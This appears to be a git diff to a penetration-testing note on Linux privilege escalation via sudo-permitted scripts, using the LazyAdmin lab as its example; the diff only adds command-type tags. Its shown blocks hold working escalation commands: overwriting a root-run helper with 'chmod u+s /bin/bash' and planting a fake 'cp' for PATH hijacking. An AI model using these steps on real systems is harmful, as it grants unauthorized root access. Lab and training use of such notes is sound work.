@@ -13,6 +13,7 @@ When `sudo -l` grants a non-root user permission to run a script as root, and th
 - The script calls another file (with a fixed path) that the current user can overwrite.
 
 ### Example (LazyAdmin)
+<!-- cmd: linux -->
 ```bash
 sudo -l
 # User www-data may run the following commands on THM-Chal:
@@ -41,6 +42,7 @@ Because `sudo` accepts a fixed absolute path (`/usr/bin/perl /home/itguy/backup.
 
 ## 3. Exploitation
 
+<!-- cmd: linux -->
 ```bash
 # 1. Overwrite the helper with the payload
 echo 'chmod u+s /bin/bash' > /etc/copy.sh
@@ -64,6 +66,7 @@ id
 
 From a foothold, this is the two-step check. `linux-enumeration.md` already has step 1 (`sudo -l`); step 2 is following every fixed path the allowed script references.
 
+<!-- cmd: linux -->
 ```bash
 # After sudo -l identifies a script
 SCRIPT=/home/itguy/backup.pl
@@ -91,6 +94,7 @@ Classic targets for this pattern:
 
 If the outer script calls `cp`, `tar`, etc. by **name** (not absolute path) and the user controls `PATH` / `SUDO_PATH`, plant a malicious `cp` in a writable directory:
 
+<!-- cmd: linux -->
 ```bash
 echo 'chmod u+s /bin/bash' > /tmp/cp
 chmod +x /tmp/cp
